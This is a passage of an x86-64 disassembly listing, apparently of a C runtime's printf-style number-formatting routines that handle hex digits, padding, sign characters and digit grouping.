  405bd3:	0f b6 c9             	movzbl %cl,%ecx
  405bd6:	ba 12 00 00 00       	mov    $0x12,%edx
  405bdb:	46 8d 2c ed 07 00 00 	lea    0x7(,%r13,8),%r13d
  405be2:	00 
  405be3:	0f 44 d0             	cmove  %eax,%edx
  405be6:	30 c0                	xor    %al,%al
  405be8:	83 c1 03             	add    $0x3,%ecx
  405beb:	45 85 c0             	test   %r8d,%r8d
  405bee:	41 0f 49 c0          	cmovns %r8d,%eax
  405bf2:	f7 c6 00 10 00 00    	test   $0x1000,%esi
  405bf8:	44 8d 24 02          	lea    (%rdx,%rax,1),%r12d
  405bfc:	74 0b                	je     0x405c09
  405bfe:	66 83 7f 20 00       	cmpw   $0x0,0x20(%rdi)
  405c03:	0f 85 a7 01 00 00    	jne    0x405db0
  405c09:	44 8b 5f 0c          	mov    0xc(%rdi),%r11d
  405c0d:	45 39 dc             	cmp    %r11d,%r12d
  405c10:	44 89 d8             	mov    %r11d,%eax
  405c13:	41 0f 4d c4          	cmovge %r12d,%eax
  405c17:	48 98                	cltq
  405c19:	48 83 c0 0f          	add    $0xf,%rax
  405c1d:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  405c21:	e8 ea f5 ff ff       	call   0x405210
  405c26:	48 29 c4             	sub    %rax,%rsp
  405c29:	48 85 db             	test   %rbx,%rbx
  405c2c:	4c 8d 64 24 20       	lea    0x20(%rsp),%r12
  405c31:	0f 84 49 02 00 00    	je     0x405e80
  405c37:	45 89 d6             	mov    %r10d,%r14d
  405c3a:	4c 89 e3             	mov    %r12,%rbx
  405c3d:	41 83 e6 20          	and    $0x20,%r14d
  405c41:	eb 0b                	jmp    0x405c4e
  405c43:	49 d3 e9             	shr    %cl,%r9
  405c46:	88 53 ff             	mov    %dl,-0x1(%rbx)
  405c49:	4d 85 c9             	test   %r9,%r9
  405c4c:	74 23                	je     0x405c71
  405c4e:	44 89 e8             	mov    %r13d,%eax
  405c51:	48 83 c3 01          	add    $0x1,%rbx
  405c55:	44 21 c8             	and    %r9d,%eax
  405c58:	8d 50 30             	lea    0x30(%rax),%edx
  405c5b:	80 fa 39             	cmp    $0x39,%dl
  405c5e:	7e e3                	jle    0x405c43
  405c60:	83 c0 37             	add    $0x37,%eax
  405c63:	49 d3 e9             	shr    %cl,%r9
  405c66:	44 09 f0             	or     %r14d,%eax
  405c69:	4d 85 c9             	test   %r9,%r9
  405c6c:	88 43 ff             	mov    %al,-0x1(%rbx)
  405c6f:	75 dd                	jne    0x405c4e
  405c71:	49 39 dc             	cmp    %rbx,%r12
  405c74:	0f 84 06 02 00 00    	je     0x405e80
  405c7a:	45 85 c0             	test   %r8d,%r8d
  405c7d:	0f 8e 6d 01 00 00    	jle    0x405df0
  405c83:	4c 89 e0             	mov    %r12,%rax
  405c86:	48 29 d8             	sub    %rbx,%rax
  405c89:	41 01 c0             	add    %eax,%r8d
  405c8c:	45 85 c0             	test   %r8d,%r8d
  405c8f:	0f 8e 5b 01 00 00    	jle    0x405df0
  405c95:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
  405c99:	48 89 d8             	mov    %rbx,%rax
  405c9c:	48 8d 54 0b 01       	lea    0x1(%rbx,%rcx,1),%rdx
  405ca1:	c6 00 30             	movb   $0x30,(%rax)
  405ca4:	48 83 c0 01          	add    $0x1,%rax
  405ca8:	48 39 d0             	cmp    %rdx,%rax
  405cab:	75 f4                	jne    0x405ca1
  405cad:	48 8d 5c 0b 01       	lea    0x1(%rbx,%rcx,1),%rbx
  405cb2:	4c 39 e3             	cmp    %r12,%rbx
  405cb5:	0f 84 a5 01 00 00    	je     0x405e60
  405cbb:	89 d8                	mov    %ebx,%eax
  405cbd:	44 29 e0             	sub    %r12d,%eax
  405cc0:	41 39 c3             	cmp    %eax,%r11d
  405cc3:	0f 8e 07 01 00 00    	jle    0x405dd0
  405cc9:	45 89 dd             	mov    %r11d,%r13d
  405ccc:	41 29 c5             	sub    %eax,%r13d
  405ccf:	45 85 ed             	test   %r13d,%r13d
  405cd2:	44 89 6f 0c          	mov    %r13d,0xc(%rdi)
  405cd6:	7e 28                	jle    0x405d00
  405cd8:	41 83 fa 6f          	cmp    $0x6f,%r10d
  405cdc:	74 15                	je     0x405cf3
  405cde:	f6 47 09 08          	testb  $0x8,0x9(%rdi)
  405ce2:	74 0f                	je     0x405cf3
  405ce4:	41 8d 45 fe          	lea    -0x2(%r13),%eax
  405ce8:	85 c0                	test   %eax,%eax
  405cea:	0f 8e a1 01 00 00    	jle    0x405e91
  405cf0:	41 89 c5             	mov    %eax,%r13d
  405cf3:	44 8b 47 10          	mov    0x10(%rdi),%r8d
  405cf7:	45 85 c0             	test   %r8d,%r8d
  405cfa:	0f 88 10 01 00 00    	js     0x405e10
  405d00:	41 8d 75 ff          	lea    -0x1(%r13),%esi
  405d04:	41 83 fa 6f          	cmp    $0x6f,%r10d
  405d08:	74 11                	je     0x405d1b
  405d0a:	f6 47 09 08          	testb  $0x8,0x9(%rdi)
  405d0e:	74 0b                	je     0x405d1b
  405d10:	44 88 13             	mov    %r10b,(%rbx)
  405d13:	c6 43 01 30          	movb   $0x30,0x1(%rbx)
  405d17:	48 83 c3 02          	add    $0x2,%rbx
  405d1b:	45 85 ed             	test   %r13d,%r13d
  405d1e:	7e 3b                	jle    0x405d5b
  405d20:	f6 47 09 04          	testb  $0x4,0x9(%rdi)
  405d24:	75 35                	jne    0x405d5b
  405d26:	41 89 f5             	mov    %esi,%r13d
  405d29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405d30:	41 83 ed 01          	sub    $0x1,%r13d
  405d34:	48 89 fa             	mov    %rdi,%rdx
  405d37:	b9 20 00 00 00       	mov    $0x20,%ecx
  405d3c:	e8 df f8 ff ff       	call   0x405620
  405d41:	41 8d 45 01          	lea    0x1(%r13),%eax
  405d45:	85 c0                	test   %eax,%eax
  405d47:	7f e7                	jg     0x405d30
  405d49:	44 8d 6e ff          	lea    -0x1(%rsi),%r13d
  405d4d:	31 c0                	xor    %eax,%eax
  405d4f:	85 f6                	test   %esi,%esi
  405d51:	0f 49 c6             	cmovns %esi,%eax
  405d54:	41 29 c5             	sub    %eax,%r13d
  405d57:	41 8d 75 ff          	lea    -0x1(%r13),%esi
  405d5b:	4c 39 e3             	cmp    %r12,%rbx
  405d5e:	76 14                	jbe    0x405d74
  405d60:	48 83 eb 01          	sub    $0x1,%rbx
  405d64:	48 89 fa             	mov    %rdi,%rdx
  405d67:	0f be 0b             	movsbl (%rbx),%ecx
  405d6a:	e8 b1 f8 ff ff       	call   0x405620
  405d6f:	4c 39 e3             	cmp    %r12,%rbx
  405d72:	75 ec                	jne    0x405d60
  405d74:	45 85 ed             	test   %r13d,%r13d
  405d77:	7e 1e                	jle    0x405d97
  405d79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405d80:	83 ee 01             	sub    $0x1,%esi
  405d83:	48 89 fa             	mov    %rdi,%rdx
  405d86:	b9 20 00 00 00       	mov    $0x20,%ecx
  405d8b:	e8 90 f8 ff ff       	call   0x405620
  405d90:	8d 46 01             	lea    0x1(%rsi),%eax
  405d93:	85 c0                	test   %eax,%eax
  405d95:	7f e9                	jg     0x405d80
  405d97:	48 8d 65 d0          	lea    -0x30(%rbp),%rsp
  405d9b:	5b                   	pop    %rbx
  405d9c:	5e                   	pop    %rsi
  405d9d:	5f                   	pop    %rdi
  405d9e:	41 5c                	pop    %r12
  405da0:	41 5d                	pop    %r13
  405da2:	41 5e                	pop    %r14
  405da4:	5d                   	pop    %rbp
  405da5:	c3                   	ret
  405da6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  405dad:	00 00 00 
  405db0:	44 89 e0             	mov    %r12d,%eax
  405db3:	ba 56 55 55 55       	mov    $0x55555556,%edx
  405db8:	f7 ea                	imul   %edx
  405dba:	44 89 e0             	mov    %r12d,%eax
  405dbd:	c1 f8 1f             	sar    $0x1f,%eax
  405dc0:	29 c2                	sub    %eax,%edx
  405dc2:	41 01 d4             	add    %edx,%r12d
  405dc5:	e9 3f fe ff ff       	jmp    0x405c09
  405dca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  405dd0:	c7 47 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rdi)
  405dd7:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  405ddc:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
  405de2:	e9 1d ff ff ff       	jmp    0x405d04
  405de7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  405dee:	00 00 
  405df0:	41 83 fa 6f          	cmp    $0x6f,%r10d
  405df4:	0f 85 b8 fe ff ff    	jne    0x405cb2
  405dfa:	f6 47 09 08          	testb  $0x8,0x9(%rdi)
  405dfe:	0f 84 ae fe ff ff    	je     0x405cb2
  405e04:	c6 03 30             	movb   $0x30,(%rbx)
  405e07:	48 83 c3 01          	add    $0x1,%rbx
  405e0b:	e9 a2 fe ff ff       	jmp    0x405cb2
  405e10:	8b 47 08             	mov    0x8(%rdi),%eax
  405e13:	25 00 06 00 00       	and    $0x600,%eax
  405e18:	3d 00 02 00 00       	cmp    $0x200,%eax
  405e1d:	0f 85 dd fe ff ff    	jne    0x405d00
  405e23:	41 83 ed 01          	sub    $0x1,%r13d
  405e27:	44 89 e8             	mov    %r13d,%eax
  405e2a:	48 8d 54 03 01       	lea    0x1(%rbx,%rax,1),%rdx
  405e2f:	48 89 d8             	mov    %rbx,%rax
  405e32:	c6 00 30             	movb   $0x30,(%rax)
  405e35:	48 83 c0 01          	add    $0x1,%rax
  405e39:	48 39 d0             	cmp    %rdx,%rax
  405e3c:	75 f4                	jne    0x405e32
  405e3e:	4d 63 ed             	movslq %r13d,%r13
  405e41:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  405e46:	4a 8d 5c 2b 01       	lea    0x1(%rbx,%r13,1),%rbx
  405e4b:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
  405e51:	e9 ae fe ff ff       	jmp    0x405d04
  405e56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  405e5d:	00 00 00 
  405e60:	44 8b 4f 10          	mov    0x10(%rdi),%r9d
  405e64:	45 85 c9             	test   %r9d,%r9d
  405e67:	0f 84 4e fe ff ff    	je     0x405cbb
  405e6d:	c6 03 30             	movb   $0x30,(%rbx)
  405e70:	48 83 c3 01          	add    $0x1,%rbx
  405e74:	e9 42 fe ff ff       	jmp    0x405cbb
  405e79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405e80:	81 e6 ff f7 ff ff    	and    $0xfffff7ff,%esi
  405e86:	4c 89 e3             	mov    %r12,%rbx
  405e89:	89 77 08             	mov    %esi,0x8(%rdi)
  405e8c:	e9 e9 fd ff ff       	jmp    0x405c7a
  405e91:	41 8d 75 fd          	lea    -0x3(%r13),%esi
  405e95:	41 89 c5             	mov    %eax,%r13d
  405e98:	e9 73 fe ff ff       	jmp    0x405d10
  405e9d:	0f 1f 00             	nopl   (%rax)
  405ea0:	55                   	push   %rbp
  405ea1:	48 89 e5             	mov    %rsp,%rbp
  405ea4:	41 54                	push   %r12
  405ea6:	57                   	push   %rdi
  405ea7:	56                   	push   %rsi
  405ea8:	53                   	push   %rbx
  405ea9:	48 83 ec 30          	sub    $0x30,%rsp
  405ead:	83 79 14 fd          	cmpl   $0xfffffffd,0x14(%rcx)
  405eb1:	48 89 ce             	mov    %rcx,%rsi
  405eb4:	0f 84 96 00 00 00    	je     0x405f50
  405eba:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
  405ebe:	66 85 d2             	test   %dx,%dx
  405ec1:	74 5f                	je     0x405f22
  405ec3:	48 63 46 14          	movslq 0x14(%rsi),%rax
  405ec7:	49 89 e4             	mov    %rsp,%r12
  405eca:	48 83 c0 0f          	add    $0xf,%rax
  405ece:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  405ed2:	e8 39 f3 ff ff       	call   0x405210
  405ed7:	48 29 c4             	sub    %rax,%rsp
  405eda:	4c 8d 45 dc          	lea    -0x24(%rbp),%r8
  405ede:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
  405ee5:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  405eea:	48 89 d9             	mov    %rbx,%rcx
  405eed:	e8 1e 2c 00 00       	call   0x408b10
  405ef2:	85 c0                	test   %eax,%eax
  405ef4:	7e 4a                	jle    0x405f40
  405ef6:	8d 40 ff             	lea    -0x1(%rax),%eax
  405ef9:	48 8d 7c 03 01       	lea    0x1(%rbx,%rax,1),%rdi
  405efe:	66 90                	xchg   %ax,%ax
  405f00:	0f be 0b             	movsbl (%rbx),%ecx
  405f03:	48 89 f2             	mov    %rsi,%rdx
  405f06:	48 83 c3 01          	add    $0x1,%rbx
  405f0a:	e8 11 f7 ff ff       	call   0x405620
  405f0f:	48 39 fb             	cmp    %rdi,%rbx
  405f12:	75 ec                	jne    0x405f00
  405f14:	4c 89 e4             	mov    %r12,%rsp
  405f17:	48 8d 65 e0          	lea    -0x20(%rbp),%rsp
  405f1b:	5b                   	pop    %rbx
  405f1c:	5e                   	pop    %rsi
  405f1d:	5f                   	pop    %rdi
  405f1e:	41 5c                	pop    %r12
  405f20:	5d                   	pop    %rbp
  405f21:	c3                   	ret
  405f22:	48 89 f2             	mov    %rsi,%rdx
  405f25:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  405f2a:	e8 f1 f6 ff ff       	call   0x405620
  405f2f:	90                   	nop
  405f30:	48 8d 65 e0          	lea    -0x20(%rbp),%rsp
  405f34:	5b                   	pop    %rbx
  405f35:	5e                   	pop    %rsi
  405f36:	5f                   	pop    %rdi
  405f37:	41 5c                	pop    %r12
  405f39:	5d                   	pop    %rbp
  405f3a:	c3                   	ret
  405f3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  405f40:	48 89 f2             	mov    %rsi,%rdx
  405f43:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  405f48:	e8 d3 f6 ff ff       	call   0x405620
  405f4d:	eb c5                	jmp    0x405f14
  405f4f:	90                   	nop
  405f50:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
  405f57:	e8 24 41 00 00       	call   0x40a080
  405f5c:	48 8b 10             	mov    (%rax),%rdx
  405f5f:	4c 8d 4d dc          	lea    -0x24(%rbp),%r9
  405f63:	48 8d 4d da          	lea    -0x26(%rbp),%rcx
  405f67:	41 b8 10 00 00 00    	mov    $0x10,%r8d
  405f6d:	e8 4e 2e 00 00       	call   0x408dc0
  405f72:	85 c0                	test   %eax,%eax
  405f74:	7e 10                	jle    0x405f86
  405f76:	0f b7 55 da          	movzwl -0x26(%rbp),%edx
  405f7a:	66 89 56 18          	mov    %dx,0x18(%rsi)
  405f7e:	89 46 14             	mov    %eax,0x14(%rsi)
  405f81:	e9 38 ff ff ff       	jmp    0x405ebe
  405f86:	0f b7 56 18          	movzwl 0x18(%rsi),%edx
  405f8a:	eb f2                	jmp    0x405f7e
  405f8c:	0f 1f 40 00          	nopl   0x0(%rax)
  405f90:	41 54                	push   %r12
  405f92:	55                   	push   %rbp
  405f93:	57                   	push   %rdi
  405f94:	56                   	push   %rsi
  405f95:	53                   	push   %rbx
  405f96:	48 83 ec 20          	sub    $0x20,%rsp
  405f9a:	44 89 c7             	mov    %r8d,%edi
  405f9d:	89 cd                	mov    %ecx,%ebp
  405f9f:	48 89 d6             	mov    %rdx,%rsi
  405fa2:	85 ff                	test   %edi,%edi
  405fa4:	4c 89 cb             	mov    %r9,%rbx
  405fa7:	45 8b 41 0c          	mov    0xc(%r9),%r8d
  405fab:	0f 8e 8f 02 00 00    	jle    0x406240
  405fb1:	44 39 c7             	cmp    %r8d,%edi
  405fb4:	0f 8d 36 01 00 00    	jge    0x4060f0
  405fba:	41 29 f8             	sub    %edi,%r8d
  405fbd:	45 89 41 0c          	mov    %r8d,0xc(%r9)
  405fc1:	45 85 c0             	test   %r8d,%r8d
  405fc4:	0f 88 26 01 00 00    	js     0x4060f0
  405fca:	8b 43 10             	mov    0x10(%rbx),%eax
  405fcd:	44 39 c0             	cmp    %r8d,%eax
  405fd0:	0f 8d 1a 01 00 00    	jge    0x4060f0
  405fd6:	41 29 c0             	sub    %eax,%r8d
  405fd9:	45 85 c0             	test   %r8d,%r8d
  405fdc:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  405fe0:	0f 8e 17 01 00 00    	jle    0x4060fd
  405fe6:	85 c0                	test   %eax,%eax
  405fe8:	0f 8e e6 02 00 00    	jle    0x4062d4
  405fee:	41 83 e8 01          	sub    $0x1,%r8d
  405ff2:	85 ff                	test   %edi,%edi
  405ff4:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  405ff8:	0f 8f 07 01 00 00    	jg     0x406105
  405ffe:	66 90                	xchg   %ax,%ax
  406000:	45 85 c0             	test   %r8d,%r8d
  406003:	7e 21                	jle    0x406026
  406005:	85 ed                	test   %ebp,%ebp
  406007:	0f 84 d7 01 00 00    	je     0x4061e4
  40600d:	41 83 e8 01          	sub    $0x1,%r8d
  406011:	45 85 c0             	test   %r8d,%r8d
  406014:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  406018:	74 0c                	je     0x406026
  40601a:	8b 43 08             	mov    0x8(%rbx),%eax
  40601d:	f6 c4 06             	test   $0x6,%ah
  406020:	0f 84 57 01 00 00    	je     0x40617d
  406026:	85 ed                	test   %ebp,%ebp
  406028:	0f 85 64 01 00 00    	jne    0x406192
  40602e:	8b 43 08             	mov    0x8(%rbx),%eax
  406031:	f6 c4 01             	test   $0x1,%ah
  406034:	0f 85 26 02 00 00    	jne    0x406260
  40603a:	a8 40                	test   $0x40,%al
  40603c:	0f 85 80 02 00 00    	jne    0x4062c2
  406042:	8b 53 0c             	mov    0xc(%rbx),%edx
  406045:	85 d2                	test   %edx,%edx
  406047:	7e 13                	jle    0x40605c
  406049:	8b 43 08             	mov    0x8(%rbx),%eax
  40604c:	25 00 06 00 00       	and    $0x600,%eax
  406051:	3d 00 02 00 00       	cmp    $0x200,%eax
  406056:	0f 84 16 02 00 00    	je     0x406272
  40605c:	85 ff                	test   %edi,%edi
  40605e:	bd 56 55 55 55       	mov    $0x55555556,%ebp
  406063:	4c 8d 63 20          	lea    0x20(%rbx),%r12
  406067:	0f 8e 43 02 00 00    	jle    0x4062b0
  40606d:	0f 1f 00             	nopl   (%rax)
  406070:	0f b6 06             	movzbl (%rsi),%eax
  406073:	b9 30 00 00 00       	mov    $0x30,%ecx
  406078:	84 c0                	test   %al,%al
  40607a:	74 07                	je     0x406083
  40607c:	0f be c8             	movsbl %al,%ecx
  40607f:	48 83 c6 01          	add    $0x1,%rsi
  406083:	48 89 da             	mov    %rbx,%rdx
  406086:	e8 95 f5 ff ff       	call   0x405620
  40608b:	83 ef 01             	sub    $0x1,%edi
  40608e:	0f 85 10 01 00 00    	jne    0x4061a4
  406094:	8b 43 10             	mov    0x10(%rbx),%eax
  406097:	85 c0                	test   %eax,%eax
  406099:	0f 8e 61 01 00 00    	jle    0x406200
  40609f:	48 89 d9             	mov    %rbx,%rcx
  4060a2:	e8 f9 fd ff ff       	call   0x405ea0
  4060a7:	85 ff                	test   %edi,%edi
  4060a9:	8b 43 10             	mov    0x10(%rbx),%eax
  4060ac:	74 23                	je     0x4060d1
  4060ae:	e9 63 01 00 00       	jmp    0x406216
  4060b3:	0f b6 06             	movzbl (%rsi),%eax
  4060b6:	b9 30 00 00 00       	mov    $0x30,%ecx
  4060bb:	84 c0                	test   %al,%al
  4060bd:	74 07                	je     0x4060c6
  4060bf:	0f be c8             	movsbl %al,%ecx
  4060c2:	48 83 c6 01          	add    $0x1,%rsi
  4060c6:	48 89 da             	mov    %rbx,%rdx
  4060c9:	e8 52 f5 ff ff       	call   0x405620
  4060ce:	8b 43 10             	mov    0x10(%rbx),%eax
  4060d1:	8d 50 ff             	lea    -0x1(%rax),%edx
  4060d4:	85 c0                	test   %eax,%eax
  4060d6:	89 53 10             	mov    %edx,0x10(%rbx)
  4060d9:	7f d8                	jg     0x4060b3
  4060db:	48 83 c4 20          	add    $0x20,%rsp
  4060df:	5b                   	pop    %rbx
  4060e0:	5e                   	pop    %rsi
  4060e1:	5f                   	pop    %rdi
  4060e2:	5d                   	pop    %rbp
  4060e3:	41 5c                	pop    %r12
  4060e5:	c3                   	ret
  4060e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4060ed:	00 00 00 
  4060f0:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  4060f7:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
  4060fd:	85 ff                	test   %edi,%edi
  4060ff:	0f 8e fb fe ff ff    	jle    0x406000
  406105:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
  406109:	0f 84 f1 fe ff ff    	je     0x406000
  40610f:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
  406114:	0f 84 e6 fe ff ff    	je     0x406000
  40611a:	8d 4f 02             	lea    0x2(%rdi),%ecx
  40611d:	ba 56 55 55 55       	mov    $0x55555556,%edx
  406122:	89 c8                	mov    %ecx,%eax
  406124:	c1 f9 1f             	sar    $0x1f,%ecx
  406127:	f7 ea                	imul   %edx
  406129:	29 ca                	sub    %ecx,%edx
  40612b:	83 fa 01             	cmp    $0x1,%edx
  40612e:	0f 8e cc fe ff ff    	jle    0x406000
  406134:	45 85 c0             	test   %r8d,%r8d
  406137:	0f 8e e9 fe ff ff    	jle    0x406026
  40613d:	44 89 c0             	mov    %r8d,%eax
  406140:	29 d0                	sub    %edx,%eax
  406142:	83 c0 01             	add    $0x1,%eax
  406145:	eb 12                	jmp    0x406159
  406147:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40614e:	00 00 
  406150:	45 85 c0             	test   %r8d,%r8d
  406153:	0f 84 8c 01 00 00    	je     0x4062e5
  406159:	41 83 e8 01          	sub    $0x1,%r8d
  40615d:	41 39 c0             	cmp    %eax,%r8d
  406160:	75 ee                	jne    0x406150
  406162:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
  406166:	e9 95 fe ff ff       	jmp    0x406000
  40616b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406170:	48 89 da             	mov    %rbx,%rdx
  406173:	b9 20 00 00 00       	mov    $0x20,%ecx
  406178:	e8 a3 f4 ff ff       	call   0x405620
  40617d:	8b 43 0c             	mov    0xc(%rbx),%eax
  406180:	8d 50 ff             	lea    -0x1(%rax),%edx
  406183:	85 c0                	test   %eax,%eax
  406185:	89 53 0c             	mov    %edx,0xc(%rbx)
  406188:	7f e6                	jg     0x406170
  40618a:	85 ed                	test   %ebp,%ebp
  40618c:	0f 84 9c fe ff ff    	je     0x40602e
  406192:	48 89 da             	mov    %rbx,%rdx
  406195:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  40619a:	e8 81 f4 ff ff       	call   0x405620
  40619f:	e9 9e fe ff ff       	jmp    0x406042
  4061a4:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
  4061a8:	0f 84 c2 fe ff ff    	je     0x406070
  4061ae:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
  4061b3:	0f 84 b7 fe ff ff    	je     0x406070
  4061b9:	89 f8                	mov    %edi,%eax
  4061bb:	f7 ed                	imul   %ebp
  4061bd:	89 f8                	mov    %edi,%eax
  4061bf:	c1 f8 1f             	sar    $0x1f,%eax
  4061c2:	29 c2                	sub    %eax,%edx
  4061c4:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
  4061c7:	39 c7                	cmp    %eax,%edi
  4061c9:	0f 85 a1 fe ff ff    	jne    0x406070
  4061cf:	49 89 d8             	mov    %rbx,%r8
  4061d2:	ba 01 00 00 00       	mov    $0x1,%edx
  4061d7:	4c 89 e1             	mov    %r12,%rcx
  4061da:	e8 a1 f4 ff ff       	call   0x405680
  4061df:	e9 8c fe ff ff       	jmp    0x406070
  4061e4:	8b 43 08             	mov    0x8(%rbx),%eax
  4061e7:	a9 c0 01 00 00       	test   $0x1c0,%eax
  4061ec:	0f 84 2b fe ff ff    	je     0x40601d
  4061f2:	e9 16 fe ff ff       	jmp    0x40600d
  4061f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4061fe:	00 00 
  406200:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  406204:	0f 85 95 fe ff ff    	jne    0x40609f
  40620a:	85 ff                	test   %edi,%edi
  40620c:	0f 1f 40 00          	nopl   0x0(%rax)
  406210:	0f 84 bb fe ff ff    	je     0x4060d1
  406216:	01 f8                	add    %edi,%eax
  406218:	89 43 10             	mov    %eax,0x10(%rbx)
  40621b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406220:	48 89 da             	mov    %rbx,%rdx
  406223:	b9 30 00 00 00       	mov    $0x30,%ecx
  406228:	e8 f3 f3 ff ff       	call   0x405620
  40622d:	83 c7 01             	add    $0x1,%edi
  406230:	78 ee                	js     0x406220
  406232:	e9 97 fe ff ff       	jmp    0x4060ce
  406237:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40623e:	00 00 
  406240:	45 85 c0             	test   %r8d,%r8d
  406243:	0f 8e 78 fd ff ff    	jle    0x405fc1
  406249:	41 83 e8 01          	sub    $0x1,%r8d
  40624d:	45 89 41 0c          	mov    %r8d,0xc(%r9)
  406251:	e9 74 fd ff ff       	jmp    0x405fca
  406256:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40625d:	00 00 00 
  406260:	48 89 da             	mov    %rbx,%rdx
  406263:	b9 2b 00 00 00       	mov    $0x2b,%ecx
  406268:	e8 b3 f3 ff ff       	call   0x405620
  40626d:	e9 d0 fd ff ff       	jmp    0x406042
  406272:	83 ea 01             	sub    $0x1,%edx
  406275:	89 53 0c             	mov    %edx,0xc(%rbx)
  406278:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40627f:	00 
  406280:	48 89 da             	mov    %rbx,%rdx
  406283:	b9 30 00 00 00       	mov    $0x30,%ecx
  406288:	e8 93 f3 ff ff       	call   0x405620
  40628d:	8b 43 0c             	mov    0xc(%rbx),%eax
  406290:	8d 50 ff             	lea    -0x1(%rax),%edx
  406293:	85 c0                	test   %eax,%eax
  406295:	89 53 0c             	mov    %edx,0xc(%rbx)
  406298:	7f e6                	jg     0x406280
  40629a:	85 ff                	test   %edi,%edi
  40629c:	bd 56 55 55 55       	mov    $0x55555556,%ebp
  4062a1:	4c 8d 63 20          	lea    0x20(%rbx),%r12
  4062a5:	0f 8f c5 fd ff ff    	jg     0x406070
  4062ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4062b0:	48 89 da             	mov    %rbx,%rdx
  4062b3:	b9 30 00 00 00       	mov    $0x30,%ecx
  4062b8:	e8 63 f3 ff ff       	call   0x405620
  4062bd:	e9 d2 fd ff ff       	jmp    0x406094
  4062c2:	48 89 da             	mov    %rbx,%rdx
  4062c5:	b9 20 00 00 00       	mov    $0x20,%ecx
  4062ca:	e8 51 f3 ff ff       	call   0x405620
  4062cf:	e9 6e fd ff ff       	jmp    0x406042
  4062d4:	f6 43 09 08          	testb  $0x8,0x9(%rbx)
  4062d8:	0f 84 1f fe ff ff    	je     0x4060fd
  4062de:	66 90                	xchg   %ax,%ax
  4062e0:	e9 09 fd ff ff       	jmp    0x405fee
  4062e5:	c7 43 0c 00 00 00 00 	movl   $0x0,0xc(%rbx)
  4062ec:	e9 35 fd ff ff       	jmp    0x406026
  4062f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  4062f8:	0f 1f 84 00 00 00 00 
  4062ff:	00 
  406300:	57                   	push   %rdi
  406301:	56                   	push   %rsi
  406302:	53                   	push   %rbx
  406303:	48 83 ec 20          	sub    $0x20,%rsp
  406307:	41 ba 01 00 00 00    	mov    $0x1,%r10d
  40630d:	4c 89 cb             	mov    %r9,%rbx
  406310:	45 8d 48 ff          	lea    -0x1(%r8),%r9d
  406314:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
  40631a:	49 89 d3             	mov    %rdx,%r11
  40631d:	44 89 c8             	mov    %r9d,%eax
  406320:	49 63 f1             	movslq %r9d,%rsi
  406323:	41 c1 f9 1f          	sar    $0x1f,%r9d
  406327:	41 f7 e8             	imul   %r8d
  40632a:	c1 fa 02             	sar    $0x2,%edx
  40632d:	41 89 d0             	mov    %edx,%r8d
  406330:	45 29 c8             	sub    %r9d,%r8d
  406333:	74 24                	je     0x406359
  406335:	41 b9 67 66 66 66    	mov    $0x66666667,%r9d
  40633b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406340:	44 89 c0             	mov    %r8d,%eax
  406343:	41 c1 f8 1f          	sar    $0x1f,%r8d
  406347:	41 83 c2 01          	add    $0x1,%r10d
  40634b:	41 f7 e9             	imul   %r9d
  40634e:	c1 fa 02             	sar    $0x2,%edx
  406351:	44 29 c2             	sub    %r8d,%edx
  406354:	41 89 d0             	mov    %edx,%r8d
  406357:	75 e7                	jne    0x406340
  406359:	8b 7b 2c             	mov    0x2c(%rbx),%edi
  40635c:	8b 53 0c             	mov    0xc(%rbx),%edx
  40635f:	41 39 fa             	cmp    %edi,%r10d
  406362:	41 0f 4d fa          	cmovge %r10d,%edi
  406366:	8d 47 02             	lea    0x2(%rdi),%eax
  406369:	39 c2                	cmp    %eax,%edx
  40636b:	7f 53                	jg     0x4063c0
